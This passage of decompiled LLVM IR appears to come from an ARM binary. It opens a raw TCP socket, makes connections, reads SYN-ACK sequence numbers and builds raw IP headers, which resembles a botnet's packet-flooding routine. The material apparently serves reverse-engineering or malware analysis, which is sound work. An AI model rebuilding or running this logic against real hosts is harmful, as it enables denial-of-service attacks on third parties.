  %v1_b56c = urem i32 %v7_b560, 256
  store i32 %v1_b56c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b574 = load i32, i32* @r5, align 4
  store i32 %v0_b574, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b57c = load i32, i32* @r4, align 4
  store i32 %v0_b57c, i32* %r0.global-to-local, align 4
  %v5_b584 = inttoptr i32 %v0_b574 to i32*
  %v6_b584 = call i32 @function_a45c(i32 %v0_b57c, i32* %v5_b584, i32 7, i32 65535)
  %v0_b588 = load i32, i32* @r5, align 4
  store i32 %v0_b588, i32* %r1.global-to-local, align 4
  %v3_b58c = mul i32 %v6_b584, 65536
  store i32 %v3_b58c, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b598 = load i32, i32* @r4, align 4
  store i32 %v0_b598, i32* %r0.global-to-local, align 4
  %v3_b59c = urem i32 %v6_b584, 65536
  store i32 %v3_b59c, i32* @sl, align 4
  %v4_b5a0 = inttoptr i32 %v0_b588 to i32*
  %v5_b5a0 = call i32 @function_a45c(i32 %v0_b598, i32* %v4_b5a0, i32 11, i32 0)
  %v1_b5a8 = urem i32 %v5_b5a0, 256
  store i32 %v1_b5a8, i32* %ip.global-to-local, align 4
  %v0_b5ac = load i32, i32* @r5, align 4
  store i32 %v0_b5ac, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b5b8 = load i32, i32* @r4, align 4
  store i32 %v0_b5b8, i32* %r0.global-to-local, align 4
  %v5_b5c0 = inttoptr i32 %v0_b5ac to i32*
  %v6_b5c0 = call i32 @function_a45c(i32 %v0_b5b8, i32* %v5_b5c0, i32 12, i32 1)
  %v1_b5c8 = urem i32 %v6_b5c0, 256
  store i32 %v1_b5c8, i32* %ip.global-to-local, align 4
  %v0_b5cc = load i32, i32* @r5, align 4
  store i32 %v0_b5cc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @r4, align 4
  store i32 %v0_b5d8, i32* %r0.global-to-local, align 4
  %v5_b5e0 = inttoptr i32 %v0_b5cc to i32*
  %v6_b5e0 = call i32 @function_a45c(i32 %v0_b5d8, i32* %v5_b5e0, i32 13, i32 1)
  %v1_b5e8 = urem i32 %v6_b5e0, 256
  store i32 %v1_b5e8, i32* %ip.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r5, align 4
  store i32 %v0_b5ec, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b5f8 = load i32, i32* @r4, align 4
  store i32 %v0_b5f8, i32* %r0.global-to-local, align 4
  %v5_b600 = inttoptr i32 %v0_b5ec to i32*
  %v6_b600 = call i32 @function_a45c(i32 %v0_b5f8, i32* %v5_b600, i32 14, i32 0)
  %v1_b608 = urem i32 %v6_b600, 256
  store i32 %v1_b608, i32* %ip.global-to-local, align 4
  %v0_b60c = load i32, i32* @r5, align 4
  store i32 %v0_b60c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b618 = load i32, i32* @r4, align 4
  store i32 %v0_b618, i32* %r0.global-to-local, align 4
  %v5_b620 = inttoptr i32 %v0_b60c to i32*
  %v6_b620 = call i32 @function_a45c(i32 %v0_b618, i32* %v5_b620, i32 15, i32 0)
  %v1_b628 = urem i32 %v6_b620, 256
  store i32 %v1_b628, i32* %ip.global-to-local, align 4
  %v0_b62c = load i32, i32* @r5, align 4
  store i32 %v0_b62c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b638 = load i32, i32* @r4, align 4
  store i32 %v0_b638, i32* %r0.global-to-local, align 4
  %v5_b640 = inttoptr i32 %v0_b62c to i32*
  %v6_b640 = call i32 @function_a45c(i32 %v0_b638, i32* %v5_b640, i32 16, i32 0)
  %v1_b648 = urem i32 %v6_b640, 256
  store i32 %v1_b648, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b654 = load i32, i32* @r5, align 4
  store i32 %v0_b654, i32* %r1.global-to-local, align 4
  %v0_b658 = load i32, i32* @r4, align 4
  store i32 %v0_b658, i32* %r0.global-to-local, align 4
  %v5_b660 = inttoptr i32 %v0_b654 to i32*
  %v6_b660 = call i32 @function_a45c(i32 %v0_b658, i32* %v5_b660, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b670 = load i32, i32* @r5, align 4
  store i32 %v0_b670, i32* %r1.global-to-local, align 4
  %v0_b674 = load i32, i32* @r4, align 4
  store i32 %v0_b674, i32* %r0.global-to-local, align 4
  %v4_b678 = inttoptr i32 %v0_b670 to i32*
  %v5_b678 = call i32 @function_a45c(i32 %v0_b674, i32* %v4_b678, i32 1, i32 1)
  %v1_b680 = urem i32 %v5_b678, 256
  store i32 %v1_b680, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b694 = call i32 @function_13940(i32 2, i32 3, i32 6)
  store i32 %v3_b694, i32* %r0.global-to-local, align 4
  %v7_b698 = icmp eq i32 %v3_b694, -1
  store i1 %v7_b698, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b694, i32* @sb, align 4
  br i1 %v7_b698, label %dec_label_pc_b888, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b4c0
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b6ac = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b6ac, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b6c0 = call i32 @function_138fc(i32 %v3_b694, i32 0, i32 3, i32 %v6_b6ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b6c0, i32* %r0.global-to-local, align 4
  %v7_b6c4 = icmp eq i32 %v5_b6c0, -1
  store i1 %v7_b6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b6c4, label %dec_label_pc_b880, label %dec_label_pc_b6cc

dec_label_pc_b6cc:                                ; preds = %dec_label_pc_b6a4
  %v0_b6cc = load i32, i32* @r7, align 4
  %v3_b6cc = mul i32 %v0_b6cc, 65536
  store i32 %v3_b6cc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b6d4 = load i32, i32* @r6, align 4
  %v2_b6d4 = icmp eq i32 %v0_b6d4, 0
  store i1 %v2_b6d4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b6dc = urem i32 %v0_b6cc, 65536
  store i32 %v3_b6dc, i32* @fp, align 4
  br i1 %v2_b6d4, label %dec_label_pc_bb0c, label %dec_label_pc_b6e4.preheader

dec_label_pc_b6e4.preheader:                      ; preds = %dec_label_pc_b6cc
  %v2_b730 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b774 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b7ac = ptrtoint i32* %stack_var_-80 to i32
  %v2_b7b8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b7bc = ptrtoint i32* %stack_var_-48 to i32
  %v4_b81c = zext i8 %tmp to i32
  %v1_b820 = and i32 %v4_b81c, 18
  %v2_b824 = icmp eq i32 %v1_b820, 18
  %v4_b9c8 = sext i8 %v5_b524 to i32
  %sext = mul i32 %v5_b540, 16777216
  %v4_b9d8 = sdiv i32 %sext, 16777216
  %v3_b808 = sext i16 %tmp61 to i32
  %v1_b82c = and i32 %v4_b81c, 5
  %v2_b82c = icmp eq i32 %v1_b82c, 0
  %v4_b76c = add i32 %v2_b730, 82
  %v5_b76c = inttoptr i32 %v4_b76c to i16*
  %v1_b95c = add i32 %v6_b660, 40
  %v1_ba70 = urem i32 %v5_b5a0, 2
  %tmp97 = sub nsw i32 0, %v1_ba70
  %v4_ba78 = and i32 %tmp97, 32
  %v1_ba88 = urem i32 %v6_b5c0, 2
  %tmp98 = sub nsw i32 0, %v1_ba88
  %v4_ba90 = and i32 %tmp98, 16
  %v1_baa0 = urem i32 %v6_b5e0, 2
  %tmp99 = sub nsw i32 0, %v1_baa0
  %v4_baa8 = and i32 %tmp99, 8
  %v1_bab8 = urem i32 %v6_b600, 2
  %tmp100 = sub nsw i32 0, %v1_bab8
  %v4_bac0 = and i32 %tmp100, 4
  %v1_bad0 = urem i32 %v6_b620, 2
  %tmp101 = sub nsw i32 0, %v1_bad0
  %v3_bad8 = and i32 %tmp101, 2
  %v1_bae8 = urem i32 %v6_b640, 2
  br label %dec_label_pc_b6e4

dec_label_pc_b6e4:                                ; preds = %dec_label_pc_b6e4.preheader, %dec_label_pc_b858
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b858 ], [ %tmp34, %dec_label_pc_b6e4.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b858 ], [ %tmp37, %dec_label_pc_b6e4.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b6f0 = call i32 @function_13940(i32 2, i32 1, i32 0)
  store i32 %v3_b6f0, i32* %r0.global-to-local, align 4
  %v7_b6f4 = icmp eq i32 %v3_b6f0, -1
  store i1 %v7_b6f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b6f0, i32* @r5, align 4
  br i1 %v7_b6f4, label %dec_label_pc_b858, label %dec_label_pc_b700

dec_label_pc_b700:                                ; preds = %dec_label_pc_b6e4, %dec_label_pc_b834
  %v0_b708 = phi i32 [ %v3_b848, %dec_label_pc_b834 ], [ %v3_b6f0, %dec_label_pc_b6e4 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b834 ], [ %stack_var_-62.0, %dec_label_pc_b6e4 ]
  %stack_var_-60.1 = phi i32 [ %v0_b908, %dec_label_pc_b834 ], [ %stack_var_-60.0, %dec_label_pc_b6e4 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b708 = call i32 @function_12f80(i32 %v0_b708, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b710 = or i32 %v2_b708, 2048
  store i32 %v1_b710, i32* %r2.global-to-local, align 4
  %v0_b714 = load i32, i32* @r5, align 4
  store i32 %v0_b714, i32* %r0.global-to-local, align 4
  %v2_b718 = call i32 @function_12f80(i32 %v0_b714, i32 4)
  %v3_b71c = load i32, i32* %stack_var_-44, align 4
  %v5_b724 = mul i32 %v3_b71c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b730, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b738 = add i32 %v5_b724, %arg2
  store i32 %v2_b738, i32* %r3.global-to-local, align 4
  %v1_b73c = add i32 %v2_b738, 20
  %v2_b73c = inttoptr i32 %v1_b73c to i8*
  %v3_b73c = load i8, i8* %v2_b73c, align 1
  %v4_b73c = zext i8 %v3_b73c to i32
  store i32 %v4_b73c, i32* %r2.global-to-local, align 4
  %v2_b740 = icmp ugt i8 %v3_b73c, 30
  %v7_b740 = icmp eq i8 %v3_b73c, 31
  store i1 %v7_b740, i1* %cpsr_z.global-to-local, align 1
  %v2_b744 = xor i1 %v7_b740, true
  %v3_b744 = and i1 %v2_b740, %v2_b744
  br i1 %v3_b744, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b700
  %v5_b744 = add i32 %v2_b738, 16
  %v6_b744 = inttoptr i32 %v5_b744 to i32*
  %v7_b744 = load i32, i32* %v6_b744, align 4
  store i32 %v7_b744, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b700, %bb
  %v4_b748 = phi i32 [ %v2_b738, %dec_label_pc_b700 ], [ %v7_b744, %bb ]
  %v4_b748.stack_var_-60.1 = select i1 %v3_b744, i32 %v4_b748, i32 %stack_var_-60.1
  %v2_b74c = xor i1 %v2_b740, true
  %v3_b74c = or i1 %v7_b740, %v2_b74c
  br i1 %v3_b74c, label %dec_label_pc_b894, label %dec_label_pc_b750

dec_label_pc_b750:                                ; preds = %bb71, %dec_label_pc_b894
  %v0_b908 = phi i32 [ %v5_b8e4, %dec_label_pc_b894 ], [ %v4_b748.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b758 = load i32, i32* @sl, align 4
  %v9_b758 = icmp eq i32 %v0_b758, 65535
  store i1 %v9_b758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b758, label %dec_label_pc_b8f0, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b750
  %v4_b75c = udiv i32 %v0_b758, 256
  %v2_b760 = urem i32 %v0_b758, 256
  store i32 %v2_b760, i32* %r2.global-to-local, align 4
  %v5_b764 = mul nuw nsw i32 %v2_b760, 256
  %v6_b764 = or i32 %v5_b764, %v4_b75c
  store i32 %v6_b764, i32* %r3.global-to-local, align 4
  store i32 %v2_b730, i32* %r0.global-to-local, align 4
  %v2_b76c = trunc i32 %v6_b764 to i16
  store i16 %v2_b76c, i16* %v5_b76c, align 2
  br label %dec_label_pc_b774

dec_label_pc_b774:                                ; preds = %.thread9, %dec_label_pc_b8f0
  %stack_var_-62.2 = phi i16 [ %v1_b8f0, %dec_label_pc_b8f0 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b774, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b77c = load i32, i32* @r5, align 4
  store i32 %v0_b77c, i32* %r0.global-to-local, align 4
  %v3_b780 = call i32 @function_13728(i32 %v0_b77c, i32 %v2_b774, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b788 = call i32 @function_12d98(i32* null)
  store i32 %v2_b788, i32* %r0.global-to-local, align 4
  store i32 %v2_b788, i32* @r4, align 4
  %v9_b7e8 = icmp eq i32 %tmp35, %v0_b908
  %v4_b810 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b7e8 to i32
  %v9_b7fc = icmp eq i1 %v9_b7e8, false
  %v9_b814 = icmp eq i32 %v3_b808, %v4_b810
  br label %dec_label_pc_b7a4

dec_label_pc_b794:                                ; preds = %.thread, %dec_label_pc_b804, %dec_label_pc_b82c, %bb75
  %v2_b794 = call i32 @function_12d98(i32* null)
  %v0_b798 = load i32, i32* @r4, align 4
  %v2_b798 = sub i32 %v2_b794, %v0_b798
  store i32 %v2_b798, i32* %r0.global-to-local, align 4
  %v7_b79c = icmp eq i32 %v2_b798, 10
  store i1 %v7_b79c, i1* %cpsr_z.global-to-local, align 1
  %v8_b7a0 = icmp sgt i32 %v2_b798, 10
  br i1 %v8_b7a0, label %dec_label_pc_b834, label %dec_label_pc_b7a4

dec_label_pc_b7a4:                                ; preds = %dec_label_pc_b794, %dec_label_pc_b774
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b7b8, i32* %r1.global-to-local, align 4
  store i32 %v2_b7bc, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b7c4 = load i32, i32* @sb, align 4
  store i32 %v0_b7c4, i32* %r0.global-to-local, align 4
  %v6_b7cc = call i32 @function_13848(i32 %v0_b7c4, i32 %v2_b7b8, i32 256, i32 16384, i32 %v2_b7ac, i32 %v2_b7bc)
  store i32 %v6_b7cc, i32* %r2.global-to-local, align 4
  %v7_b7d4 = icmp eq i32 %v6_b7cc, -1
  store i1 %v7_b7d4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b7d4, label %dec_label_pc_b888, label %dec_label_pc_b7e0

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b7a4
  store i32 %v0_b908, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b7f4 = icmp eq i32 %v6_b7cc, 40
  store i1 %v7_b7f4, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b7cc, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b7e0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b794

bb75:                                             ; preds = %dec_label_pc_b7e0
  store i1 %v9_b7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b7fc, label %dec_label_pc_b794, label %dec_label_pc_b804

dec_label_pc_b804:                                ; preds = %bb75
  store i32 %v3_b808, i32* @lr, align 4
  store i32 %v2_b730, i32* @r3, align 4
  store i32 %v4_b810, i32* %r2.global-to-local, align 4
  store i1 %v9_b814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b814, label %dec_label_pc_b81c, label %dec_label_pc_b794

dec_label_pc_b81c:                                ; preds = %dec_label_pc_b804
  store i32 %v4_b81c, i32* %r2.global-to-local, align 4
  store i32 %v1_b820, i32* @r3, align 4
  store i1 %v2_b824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b824, label %dec_label_pc_b900, label %dec_label_pc_b82c

dec_label_pc_b82c:                                ; preds = %dec_label_pc_b81c
  store i1 %v2_b82c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b82c, label %dec_label_pc_b794, label %dec_label_pc_b834

dec_label_pc_b834:                                ; preds = %dec_label_pc_b82c, %dec_label_pc_b794
  %v0_b834 = load i32, i32* @r5, align 4
  store i32 %v0_b834, i32* %r0.global-to-local, align 4
  %v1_b838 = call i32 @function_1314c(i32 %v0_b834)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b848 = call i32 @function_13940(i32 2, i32 1, i32 0)
  store i32 %v3_b848, i32* %r0.global-to-local, align 4
  %v3_b84c = icmp eq i32 %v3_b848, -1
  %v8_b84c = icmp eq i32 %v3_b848, -1
  store i1 %v8_b84c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b848, i32* @r5, align 4
  br i1 %v3_b84c, label %dec_label_pc_b858, label %dec_label_pc_b700

dec_label_pc_b858:                                ; preds = %dec_label_pc_b834, %dec_label_pc_b6e4, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b6e4 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b834 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b6e4 ], [ %v0_b908, %bb82 ], [ %v0_b908, %dec_label_pc_b834 ]
  %v3_b858 = load i32, i32* %stack_var_-44, align 4
  %v1_b85c = add i32 %v3_b858, 1
  store i32 %v1_b85c, i32* @r3, align 4
  %v1_b860 = load i32, i32* @r6, align 4
  %v9_b860 = icmp eq i32 %v1_b85c, %v1_b860
  store i1 %v9_b860, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b85c, i32* %stack_var_-44, align 4
  %v5_b868 = icmp slt i32 %v1_b85c, %v1_b860
  br i1 %v5_b868, label %dec_label_pc_b6e4, label %dec_label_pc_b86c

dec_label_pc_b86c:                                ; preds = %dec_label_pc_b858
  store i32 %v6_b660, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb1c

dec_label_pc_b880:                                ; preds = %dec_label_pc_b6a4
  %v0_b880 = load i32, i32* @sb, align 4
  store i32 %v0_b880, i32* %r0.global-to-local, align 4
  %v1_b884 = call i32 @function_1314c(i32 %v0_b880)
  store i32 %v1_b884, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b888

dec_label_pc_b888:                                ; preds = %dec_label_pc_b7a4, %dec_label_pc_b4c0, %dec_label_pc_b880
  %v1_b890 = phi i32 [ %v3_b694, %dec_label_pc_b4c0 ], [ %v1_b884, %dec_label_pc_b880 ], [ 0, %dec_label_pc_b7a4 ]
  store i32 %v27_b4c0, i32* %lr.global-to-local, align 4
  ret i32 %v1_b890

dec_label_pc_b894:                                ; preds = %bb71
  %v1_b894 = add i32 %v4_b748, 16
  %v2_b894 = inttoptr i32 %v1_b894 to i32*
  %v3_b894 = load i32, i32* %v2_b894, align 4
  store i32 %v3_b894, i32* @r4, align 4
  %v0_b898 = call i32 @function_f700()
  store i32 %v0_b898, i32* %r0.global-to-local, align 4
  %v3_b89c = load i32, i32* %stack_var_-44, align 4
  %v5_b8a4 = mul i32 %v3_b89c, 24
  %v0_b8ac = load i32, i32* @r4, align 4
  %v1_b8ac = and i32 %v0_b8ac, 16711680
  store i32 %v1_b8ac, i32* %ip.global-to-local, align 4
  %v3_b8b0 = udiv i32 %v0_b8ac, 16777216
  %v2_b8b4 = add i32 %v5_b8a4, %arg2
  store i32 %v2_b8b4, i32* %r1.global-to-local, align 4
  %v4_b8b8 = udiv i32 %v1_b8ac, 256
  %v5_b8b8 = or i32 %v4_b8b8, %v3_b8b0
  store i32 %v5_b8b8, i32* %r2.global-to-local, align 4
  %v1_b8bc = and i32 %v0_b8ac, 65280
  store i32 %v1_b8bc, i32* %r3.global-to-local, align 4
  %v1_b8c0 = add i32 %v2_b8b4, 20
  %v2_b8c0 = inttoptr i32 %v1_b8c0 to i8*
  %v3_b8c0 = load i8, i8* %v2_b8c0, align 1
  %v4_b8c0 = zext i8 %v3_b8c0 to i32
  store i32 %v4_b8c0, i32* %ip.global-to-local, align 4
  %v5_b8c8 = call i32 @llvm.bswap.i32(i32 %v0_b8ac)
  %v7_b8cc = lshr i32 %v0_b898, %v4_b8c0
  %v8_b8cc = add i32 %v7_b8cc, %v5_b8c8
  store i32 %v8_b8cc, i32* %r2.global-to-local, align 4
  %v1_b8d0 = and i32 %v8_b8cc, 16711680
  store i32 %v1_b8d0, i32* %r0.global-to-local, align 4
  %v1_b8dc = and i32 %v8_b8cc, 65280
  store i32 %v1_b8dc, i32* %r1.global-to-local, align 4
  %v5_b8e4 = call i32 @llvm.bswap.i32(i32 %v8_b8cc)
  store i32 %v5_b8e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b750

dec_label_pc_b8f0:                                ; preds = %dec_label_pc_b750
  %v0_b8f0 = call i32 @function_f700()
  %v1_b8f0 = trunc i32 %v0_b8f0 to i16
  store i32 %v0_b8f0, i32* %r0.global-to-local, align 4
  store i32 %v2_b730, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b774

dec_label_pc_b900:                                ; preds = %dec_label_pc_b81c
  %v3_b900 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b900, i32* @r4, align 4
  store i32 %v2_b4dc, i32* %ip.global-to-local, align 4
  %v5_b908 = mul i32 %v3_b900, 16
  %v6_b908 = add i32 %v5_b908, %v2_b4dc
  %v7_b908 = inttoptr i32 %v6_b908 to i32*
  store i32 %v0_b908, i32* %v7_b908, align 4
  %v0_b90c = load i32, i32* @r8, align 4
  %v1_b90c = add i32 %v0_b90c, 4
  %v2_b90c = inttoptr i32 %v1_b90c to i32*
  %v3_b90c = load i32, i32* %v2_b90c, align 4
  store i32 %v3_b90c, i32* %r1.global-to-local, align 4
  %v1_b918 = and i32 %v3_b90c, 65280
  store i32 %v1_b918, i32* %r2.global-to-local, align 4
  store i32 %v2_b4dc, i32* %r0.global-to-local, align 4
  %v0_b928 = load i32, i32* @r4, align 4
  %v3_b928 = mul i32 %v0_b928, 16
  %v2_b92c = add i32 %v3_b928, %v2_b4dc
  store i32 %v2_b92c, i32* %ip.global-to-local, align 4
  %v5_b930 = call i32 @llvm.bswap.i32(i32 %v3_b90c)
  store i32 %v5_b930, i32* %r3.global-to-local, align 4
  %v2_b934 = add i32 %v2_b92c, 4
  %v3_b934 = inttoptr i32 %v2_b934 to i32*
  store i32 %v5_b930, i32* %v3_b934, align 4
  %v0_b938 = load i32, i32* @r8, align 4
  %v1_b938 = add i32 %v0_b938, 8
  %v2_b938 = inttoptr i32 %v1_b938 to i32*
  %v3_b938 = load i32, i32* %v2_b938, align 4
  store i32 %v3_b938, i32* %r1.global-to-local, align 4
  %v1_b93c = and i32 %v3_b938, 16711680
  store i32 %v1_b93c, i32* %r0.global-to-local, align 4
  store i32 %v6_b660, i32* %r2.global-to-local, align 4
  %v5_b954 = call i32 @llvm.bswap.i32(i32 %v3_b938)
  store i32 %v5_b954, i32* %r3.global-to-local, align 4
  %v1_b958 = add i32 %v0_b938, 2
  %v2_b958 = inttoptr i32 %v1_b958 to i16*
  %v3_b958 = load i16, i16* %v2_b958, align 2
  %v4_b958 = zext i16 %v3_b958 to i32
  store i32 %v4_b958, i32* %r1.global-to-local, align 4
  store i32 %v1_b95c, i32* @r7, align 4
  %v0_b960 = load i32, i32* @lr, align 4
  %v1_b960 = trunc i32 %v0_b960 to i16
  %v2_b960 = load i32, i32* %ip.global-to-local, align 4
  %v3_b960 = add i32 %v2_b960, 14
  %v4_b960 = inttoptr i32 %v3_b960 to i16*
  store i16 %v1_b960, i16* %v4_b960, align 2
  %v0_b964 = load i32, i32* %r1.global-to-local, align 4
  %v1_b964 = trunc i32 %v0_b964 to i16
  %v2_b964 = load i32, i32* %ip.global-to-local, align 4
  %v3_b964 = add i32 %v2_b964, 12
  %v4_b964 = inttoptr i32 %v3_b964 to i16*
  store i16 %v1_b964, i16* %v4_b964, align 2
  %v0_b968 = load i32, i32* %r3.global-to-local, align 4
  %v1_b968 = load i32, i32* %ip.global-to-local, align 4
  %v2_b968 = add i32 %v1_b968, 8
  %v3_b968 = inttoptr i32 %v2_b968 to i32*
  store i32 %v0_b968, i32* %v3_b968, align 4
  %v0_b96c = load i32, i32* @r7, align 4
  store i32 %v0_b96c, i32* @r0, align 4
  %v0_b970 = call i32 @function_13b88()
  store i32 %v0_b970, i32* %r0.global-to-local, align 4
  store i32 %v2_b4ec, i32* %r3.global-to-local, align 4
  %v2_b97c = load i32, i32* @r4, align 4
  %v5_b97c = mul i32 %v2_b97c, 4
  %v6_b97c = add i32 %v5_b97c, %v2_b4ec
  %v7_b97c = inttoptr i32 %v6_b97c to i32*
  store i32 %v0_b970, i32* %v7_b97c, align 4
  %v3_b980 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b980, i32* %r2.global-to-local, align 4
  %v0_b984 = load i32, i32* %r3.global-to-local, align 4
  %v4_b984 = mul i32 %v3_b980, 4
  %v5_b984 = add i32 %v0_b984, %v4_b984
  %v6_b984 = inttoptr i32 %v5_b984 to i32*
  %v7_b984 = load i32, i32* %v6_b984, align 4
  store i32 %v7_b984, i32* @r4, align 4
  %v1_b988 = inttoptr i32 %v7_b984 to i8*
  %v2_b988 = load i8, i8* %v1_b988, align 1
  %tmp103 = urem i8 %v2_b988, 16
  %v1_b98c = zext i8 %tmp103 to i32
  %v1_b990 = or i32 %v1_b98c, 64
  store i32 %v1_b990, i32* %r3.global-to-local, align 4
  %v1_b994 = trunc i32 %v1_b990 to i8
  store i8 %v1_b994, i8* %v1_b988, align 1
  %v0_b998 = load i32, i32* @r4, align 4
  %v1_b998 = inttoptr i32 %v0_b998 to i8*
  %v2_b998 = load i8, i8* %v1_b998, align 1
  %v0_b99c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b99c, 256
  %v1_b9a4 = and i8 %v2_b998, -16
  %v1_b9a8 = or i8 %v1_b9a4, 5
  %v1_b9ac = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b99c, 256
  %v4_b9b0 = urem i32 %tmp78, 256
  %v5_b9b0 = or i32 %v4_b9b0, %v1_b9ac
  store i32 %v5_b9b0, i32* %r2.global-to-local, align 4
  %v0_b9b4 = load i32, i32* @fp, align 4
  %v1_b9b4 = urem i32 %v0_b9b4, 256
  store i32 %v1_b9b4, i32* %r0.global-to-local, align 4
  store i32 %v1_b56c, i32* %ip.global-to-local, align 4
  %v3_b9bc = udiv i32 %v0_b9b4, 256
  store i32 %v3_b9bc, i32* %r1.global-to-local, align 4
  store i8 %v1_b9a8, i8* %v1_b998, align 1
  %v0_b9c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b9c4 = load i32, i32* %r0.global-to-local, align 4
  %v4_b9c4 = mul i32 %v1_b9c4, 256
  %v5_b9c4 = or i32 %v4_b9c4, %v0_b9c4
  store i32 %v5_b9c4, i32* %r1.global-to-local, align 4
  store i32 %v4_b9c8, i32* %r0.global-to-local, align 4
  %v2_b9cc = load i32, i32* @r4, align 4
  %v3_b9cc = add i32 %v2_b9cc, 1
  %v4_b9cc = inttoptr i32 %v3_b9cc to i8*
  store i8 %v5_b524, i8* %v4_b9cc, align 1
  %v0_b9d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b9d0 = trunc i32 %v0_b9d0 to i16
  %v2_b9d0 = load i32, i32* @r4, align 4
  %v3_b9d0 = add i32 %v2_b9d0, 4
  %v4_b9d0 = inttoptr i32 %v3_b9d0 to i16*
  store i16 %v1_b9d0, i16* %v4_b9d0, align 2
